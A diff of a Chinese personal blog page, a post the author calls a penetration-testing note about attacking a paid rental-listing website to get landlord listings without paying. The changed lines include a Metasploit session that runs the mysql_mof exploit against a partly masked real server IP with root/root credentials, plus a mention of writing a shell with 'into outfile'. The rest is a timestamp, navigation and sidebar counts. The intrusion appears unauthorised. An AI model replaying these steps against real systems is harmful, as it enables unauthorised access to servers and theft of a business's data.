@@ -125,7 +125,7 @@
 <meta property="og:image" content="https://kionf.com/article_images/hack-note-00100/hack-note-00111.jpg">
 <meta property="og:image" content="https://kionf.com/article_images/hack-note-00100/hack-note-00112.jpg">
 <meta property="og:image" content="https://kionf.com/article_images/hack-note-00100/hack-note-00113.jpg">
-<meta property="og:updated_time" content="2018-09-13T05:50:48.435Z">
+<meta property="og:updated_time" content="2018-09-13T05:54:33.554Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试小记-由租房引发的惨案">
 <meta name="twitter:description" content="作为一名，怀揣远(ri)大(tian)理(ri)想(di)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的我心慌，想直接找个房东整租一个，偶然间了解到到xx网站是专为中介统计的房东房源，当然是花钱的（MLGB），遂引发了以下惨案。人狠话不多，整！">
@@ -475,7 +475,7 @@
 <li><code>into outfile</code>写入shell</li>
 </ul>
 <p>祭出我的宝贝 <code>metasploit</code></p>
-<h3 id="1-MOF提权"><a href="#1-MOF提权" class="headerlink" title="1) MOF提权"></a>1) MOF提权</h3><figure class="highlight bash"><figcaption><span class="caption">脚本小子三部曲</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># 1. 启动msf选择exploit</span></div><div class="line"></div><div class="line">&gt; msfconsole</div><div class="line"></div><div class="line">&gt; search mysql_mof</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                             Disclosure Date  Rank       Description</div><div class="line">   ----                             ---------------  ----       -----------</div><div class="line">   exploit/windows/mysql/mysql_mof  2012-12-01       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</div><div class="line"></div><div class="line">&gt; use exploit/windows/mysql/mysql_mof</div><div class="line"></div><div class="line"><span class="comment"># 2. 设置目标</span></div><div class="line"></div><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/mysql/mysql_mof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   PASSWORD                   yes       The password to authenticate with</div><div class="line">   RHOST                      yes       The target address</div><div class="line">   RPORT     3306             yes       The target port (TCP)</div><div class="line">   USERNAME                   yes       The username to authenticate as</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   MySQL on Windows prior to Vista</div><div class="line"></div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div><div class="line"></div><div class="line"><span class="comment"># 3. 启动</span></div><div class="line">&gt; exploit</div><div class="line"></div><div class="line">&gt; `show advanced`显示高级选项，进行自定义</div></pre></div></div></figure>
+<h3 id="1-MOF提权"><a href="#1-MOF提权" class="headerlink" title="1) MOF提权"></a>1) MOF提权</h3><figure class="highlight bash"><figcaption><span class="caption">脚本小子三部曲</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># 1. 启动msf选择exploit</span></div><div class="line"></div><div class="line">&gt; msfconsole</div><div class="line"></div><div class="line">&gt; search mysql_mof</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                             Disclosure Date  Rank       Description</div><div class="line">   ----                             ---------------  ----       -----------</div><div class="line">   exploit/windows/mysql/mysql_mof  2012-12-01       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</div><div class="line"></div><div class="line">&gt; use exploit/windows/mysql/mysql_mof</div><div class="line"></div><div class="line"><span class="comment"># 2. 设置目标</span></div><div class="line"></div><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; show options</div><div class="line"><span class="comment"># show advanced</span></div><div class="line"><span class="comment"># 显示高级选项，进行自定义这里不需要暂且不展开讨论</span></div><div class="line"></div><div class="line"></div><div class="line">Module options (exploit/windows/mysql/mysql_mof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   PASSWORD                   yes       The password to authenticate with</div><div class="line">   RHOST                      yes       The target address</div><div class="line">   RPORT     3306             yes       The target port (TCP)</div><div class="line">   USERNAME                   yes       The username to authenticate as</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   MySQL on Windows prior to Vista</div><div class="line"></div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div><div class="line"></div><div class="line"><span class="comment"># 3. 启动</span></div><div class="line">&gt; exploit</div></pre></div></div></figure>
 <span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/hack-note-00100/hack-note-00107.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
 <p>命令执行成功，没有返回session， 利用程序可能被删除</p>
 <hr>
@@ -597,6 +597,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2018/09/13/metasploit-presistence/" rel="prev" title="关于 meterpreter 持久化问题研究">
+                关于 meterpreter 持久化问题研究 <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -674,7 +678,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-count">34</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -685,7 +689,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">31</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -696,7 +700,7 @@
             
             <div class="site-state-item site-state-tags">
               
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">标签</span>
               
             </div>
